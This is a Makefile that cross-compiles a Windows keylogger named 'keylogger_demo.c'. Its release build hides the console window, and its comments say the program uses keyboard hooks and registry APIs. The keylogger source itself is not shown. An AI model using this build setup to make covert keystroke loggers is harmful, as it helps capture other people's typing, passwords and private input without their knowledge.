# Makefile for keylogger_demo.c
# Coded by Egyan
# Requires MinGW-w64 on Linux/Kali or gcc on Windows
#
# On Kali (cross-compile for Windows):
#   sudo apt install mingw-w64
#   make
#
# On Windows with MinGW:
#   make

CC      = x86_64-w64-mingw32-gcc
CFLAGS  = -Wall -Wextra -O2
# -mwindows  = no console window
# -luser32   = keyboard hooks, window title APIs
# -ladvapi32 = registry APIs
LDFLAGS = -mwindows -luser32 -ladvapi32

TARGET  = keylogger_demo.exe
SRC     = keylogger_demo.c

all: $(TARGET)

$(TARGET): $(SRC)
	$(CC) $(CFLAGS) $(SRC) -o $(TARGET) $(LDFLAGS)

clean:
	rm -f $(TARGET) keylogger_demo_debug.exe

# Build with console window visible (for debugging/testing)
debug:
	$(CC) -Wall -g $(SRC) -o keylogger_demo_debug.exe -luser32 -ladvapi32
